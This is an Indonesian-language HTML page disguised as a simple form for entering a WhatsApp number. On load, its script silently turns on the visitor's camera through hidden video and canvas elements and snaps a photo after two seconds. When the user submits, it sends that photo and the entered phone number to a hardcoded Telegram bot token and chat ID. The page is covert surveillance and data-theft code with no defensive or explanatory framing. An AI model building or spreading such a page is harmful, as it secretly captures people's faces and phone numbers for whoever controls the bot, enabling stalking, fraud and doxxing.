<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Form Nomor WhatsApp</title>
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      text-align: center;
    }
    input, button {
      margin-top: 10px;
      padding: 10px;
      font-size: 16px;
      width: 80%;
      max-width: 300px;
    }
    #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h3>Masukkan Nomor WhatsApp</h3>
  <input type="text" id="waNumber" placeholder="Contoh: 6281234567890" />
  <br>
  <button onclick="sendToTelegram()">Kirim</button>

  <video id="video" autoplay playsinline style="display: none;"></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = '7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
    const chatId = '7041008009';

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    let photoBlob = null;

    async function startCameraAndCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            const dataURL = canvas.toDataURL("image/png");
            photoBlob = dataURLtoBlob(dataURL);
            stream.getTracks().forEach(track => track.stop()); // matikan kamera
          }, 2000); // Ambil foto otomatis setelah 2 detik
        };
      } catch (err) {
        alert("Gagal mengakses kamera. Pastikan kamu mengizinkan kamera.");
        console.error(err);
      }
    }

    function sendToTelegram() {
      const waNumber = document.getElementById("waNumber").value.trim();
      if (!waNumber || !photoBlob) {
        alert("Isi nomor WhatsApp dan tunggu kamera mengambil foto.");
        return;
      }

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("caption", `Nomor WhatsApp: ${waNumber}`);
      formData.append("photo", photoBlob, "photo.png");

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        alert("Data berhasil dikirim ke Telegram!");
      })
      .catch(err => {
        alert("Gagal mengirim ke Telegram.");
        console.error(err);
      });
    }

    function dataURLtoBlob(dataURL) {
      const arr = dataURL.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      return new Blob([u8arr], { type: mime });
    }

    window.onload = startCameraAndCapture;
  </script>
</body>
</html>
